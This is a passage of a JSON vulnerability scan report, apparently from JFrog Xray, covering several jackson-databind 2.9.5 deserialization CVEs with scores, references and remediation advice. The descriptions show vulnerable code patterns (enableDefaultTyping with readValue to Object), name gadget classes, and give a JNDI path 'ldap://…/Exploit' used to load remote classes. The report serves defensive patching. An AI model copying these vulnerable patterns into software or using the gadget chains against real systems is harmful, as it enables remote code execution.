`mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [pastdev.httpcomponents]( https://github.com/lucastheisen/httpcomponents) gadget, an attacker can\nachieve remote code execution by creating a `JndiConfiguration ` object and then calling the `load` method. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `pastdev.httpcomponents`  in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `pastdev.httpcomponents`  in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `pastdev.httpcomponents`` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36518",
            "cvss_v2_score": "5.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-787"
            ],
            "cwe_details": {
              "CWE-787": {
                "name": "Out-of-bounds Write",
                "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "1"
                  }
                ]
              }
            }
          }
        ],
        "summary": "jackson-databind before 2.13.0 allows a Java StackOverflow exception and denial of service via a large depth of nested objects.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.12.6.1]",
              "[2.13.2.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-199816",
        "references": [
          "https://github.com/FasterXML/jackson-databind/issues/2816",
          "https://www.debian.org/security/2022/dsa-5283",
          "https://github.com/FasterXML/jackson-databind/commit/b3587924ee5d8695942f364d0d404d48d0ea6126",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/apiman/apiman/security/advisories/GHSA-q95j-488q-5q3p",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.12",
          "https://github.com/apiman/apiman",
          "https://lists.debian.org/debian-lts-announce/2022/11/msg00035.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36518",
          "https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b",
          "https://security.netapp.com/advisory/ntap-20220506-0004",
          "https://lists.debian.org/debian-lts-announce/2022/05/msg00001.html",
          "https://security.netapp.com/advisory/ntap-20220506-0004/",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/0a8157c6ca478b1bc7be4ba7dccdb3863275f0de",
          "https://github.com/FasterXML/jackson-databind/commit/3cc52f82ecf943e06c1d7c3b078e405fb3923d2b",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.13",
          "https://github.com/advisories/GHSA-57j2-w4cx-62h2",
          "https://github.com/FasterXML/jackson-databind/commit/8238ab41d0350fb915797c89d46777b4496b74fd"
        ],
        "extended_information": {
          "short_description": "A stack exhaustion in jackson-databind can lead to denial of service when deserializing external data as generic objects.",
          "full_description": "[Jackson-databind](https://github.com/FasterXML/jackson-databind) is a streaming API library for Java. One of its components, `ObjectMapper`, is responsible for serialization and deserialization of Java objects.\n\nIt was discovered that the `UntypedObjectDeserializer` is expensive for deeply nested Objects and Arrays, which quickly leads to massive memory consumption and denial of service.\n\nTo exploit this issue, an attacker must be able to supply an arbitrary serialized input (a deeply nested object) to the `readValue` API. In addition, the `readValue` API call must map the output to an untyped object such as `Object` or `Map\u003cString, Object\u003e`. \n\nExample of a vulnerable code snippet -\n`objMapper.readValue(userInput, Object.class);`",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has an exploit published",
              "description": "The fix's tests contain several crashing PoCs"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into a `ObjectMapper.readValue` call. The `readValue` call must accept an object type of `Object` or `Map\u003cString, Object\u003e`. For example - `objMapper.readValue(userInput, Object.class);`",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "It is unlikely that a `readValue` call would map the object to a generic type (ex. `Object`)",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-14060",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oadd.org.apache.xalan.lib.sql.JNDIConnectionPool (aka apache/drill).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-100648",
        "references": [
          "https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-572314",
          "https://github.com/FasterXML/jackson-databind/commit/d1c67a0396e84c08d0558fbb843b5bd1f26e1921",
          "https://lists.debian.org/debian-lts-announce/2020/07/msg00001.html",
          "https://security.netapp.com/advisory/ntap-20200702-0003/",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-14060",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/ac7232e3f9004bdb4f11dcb5bc6c1fadf074f5f7",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://security.netapp.com/advisory/ntap-20200702-0003",
          "https://github.com/advisories/GHSA-j823-4qch-3rgm",
          "https://github.com/FasterXML/jackson-databind/issues/2688",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Xalan (aka drill) in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\n\nSpecifically, with the [apache-xalan]( https://github.com/apache /xalan-j) gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by loading arbitrary Java classes. For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to something like `\"ldap://127.0.0.1:1088/Exploit\"` as detailed in this [PoC]( https://github.com/Al1ex/CVE-2020-35728) of a similar issue.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-xalan in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-xalan in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `apache-xalan` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-14893",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-200",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-200": {
                "name": "Exposure of Sensitive Information to an Unauthorized Actor",
                "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A flaw was discovered in FasterXML jackson-databind in all versions before 2.9.10 and 2.10.0, where it would permit polymorphic deserialization of malicious objects using the xalan JNDI gadget when used in conjunction with polymorphic type handling methods such as `enableDefaultTyping()` or when @JsonTypeInfo is using `Id.CLASS` or `Id.MINIMAL_CLASS` or in any other way which ObjectMapper.readValue might instantiate objects from unsafe sources. An attacker could use this flaw to execute arbitrary code.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.7.9.7]",
              "[2.8.11.5]",
              "[2.9.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95103",
        "references": [
          "https://security.netapp.com/advisory/ntap-20200327-0006/",
          "https://github.com/FasterXML/jackson-databind/issues/2469",
          "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14893",
          "https://access.redhat.com/errata/RHSA-2020:0729",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-14893",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/998efd708284778f29d83d7962a9bd935c228317",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://security.netapp.com/advisory/ntap-20200327-0006",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Xalan (aka xalan2) in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [apache-xalan]( https://github.com/apache /xalan-j) gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by loading arbitrary Java classes. For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to a path such as `\"ldap://127.0.0.1:1088/Exploit\"` and perform remote code execution by calling `getConnection` as detailed in this [PoC]( https://github.com/Al1ex/CVE-2020-35728) of a similar vulnerability.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-xalan in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-xalan in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `apache-xalan` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36179",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138344",
        "references": [
          "https://lists.apache.org/thread.html/rc255f41d9a61d3dc79a51fb5c713de4ae10e71e3673feeb0b180b436@%3Cissues.spark.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36179",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/3ded28aece694d0df39c9f0fa1ff385b14a8656b",
          "https://github.com/FasterXML/jackson-databind/issues/3004",
          "https://lists.apache.org/thread.html/rc255f41d9a61d3dc79a51fb5c713de4ae10e71e3673feeb0b180b436%40%3Cissues.spark.apache.org%3E",
          "https://github.com/advisories/GHSA-9gph-22xh-8x98",
          "https://www.oracle.com/security-alerts/cpujan2022.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-dbcp in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the dbcp in [commons-dbcp]( https://github.com/apache/commons-dbcp) gadget, an attacker can call `setUrl` or control the content of the object, but the real-world impact from these primitives, in the general case, is unknown.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `commons-dbcp` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `commons-dbcp` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `commons-dbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-17267",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-89694",
        "references": [
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20191017-0006/",
          "https://access.redhat.com/errata/RHSA-2020:0160",
          "https://access.redhat.com/errata/RHSA-2020:0445",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-17267",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://github.com/advisories/GHSA-f3j5-rmmp-3fc5",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.3...jackson-databind-2.9.10",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9d727fc681fb3828794acbefcaee31393742b4d73a29461ccd9597a8@%3Cdev.skywalking.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://github.com/FasterXML/jackson-databind/issues/2460",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/191a4cdf87b56d2ddddb77edd895ee756b7f75eb",
          "https://lists.apache.org/thread.html/r9d727fc681fb3828794acbefcaee31393742b4d73a29461ccd9597a8%40%3Cdev.skywalking.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/12/msg00013.html",
          "https://access.redhat.com/errata/RHSA-2020:0161",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0159"
        ],
        "extended_information": {
          "short_description": "A typing issue in net.sf.ehcache in Jackson-databind allows a remote attacker to perform remote code execution.",
